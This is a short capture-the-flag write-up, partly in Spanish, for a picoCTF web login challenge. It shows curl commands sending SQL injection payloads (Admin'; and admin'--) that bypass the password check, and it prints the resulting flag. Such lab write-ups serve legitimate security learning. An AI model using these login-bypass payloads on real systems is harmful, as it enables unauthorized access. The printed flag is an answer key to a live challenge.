## Objetivo 
There is a website running at `https://jupiter.challenges.picoctf.org/problem/64649/` ([link](https://jupiter.challenges.picoctf.org/problem/64649/)). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://jupiter.challenges.picoctf.org:64649
## Solución  
```bash
# SQLi detected.
---------------------------------------------------------

kali@KaliEND:~$ curl -s https://jupiter.challenges.picoctf.org/problem/64649/login.php -d "username=Admin';&password=password&debu  
g=1"  
<pre>username: Admin';  
password: password  
SQL query: SELECT * FROM users WHERE name='Admin';' AND password='password'

kali@KaliEND:~$ curl -s https://jupiter.challenges.picoctf.org/problem/64649/login.php -d "username=admin'--&password=password&ebu  
g=1"  
<h1>Logged in!</h1><p>Your flag is: picoCTF{m0R3_SQL_plz_aee925db}</p>kali@KaliEND:~$

```
## Notas Adicionales 
el mismo sitio de personas irlandesas, pero ahora con una proteccion contra inyecciones sql.
lo que se hace para resolver este reto picoctf es ingresar en el campo de usuario:
`Admin';` pero no funciona, por lo cual tratamos con `admin'--` para que solamnte tome la secuencia sql hasta el apostrofo ' y solamente se inicie sesion como administrador sin tener que llenar correctamente el campo password.
### Referencias

